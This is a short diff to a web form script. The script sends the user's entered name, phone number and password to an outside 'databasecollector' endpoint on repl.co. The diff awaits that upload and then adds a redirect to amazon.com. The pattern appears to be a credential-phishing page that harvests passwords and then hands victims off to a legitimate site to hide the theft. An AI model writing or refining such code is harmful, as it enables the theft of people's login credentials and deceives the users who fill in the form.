@@ -10,7 +10,7 @@ submitBtn.onclick = (event) => {
   submit();
 }
 
-function submit() {
+async function submit() {
   const userName = document.getElementById("name");
   const phoneNumber = document.getElementById("phoneNumber");
   const password = document.getElementById("password");
@@ -21,7 +21,7 @@ function submit() {
     "password": password.value
   };
 
-  fetch('https://databasecollector.angry-creator.repl.co/', {
+  await fetch('https://databasecollector.angry-creator.repl.co/', {
     method: "POST",
     mode: "cors",
     headers: {
@@ -30,7 +30,9 @@ function submit() {
     body: JSON.stringify(data)
   })
     .then((response) => response.json())
-    .then((data) => console.log(data));
+    .then((data) => console.log(data)).finally(() => {
+      window.location.href = "https://www.amazon.com/";
+    });
 }
 
 
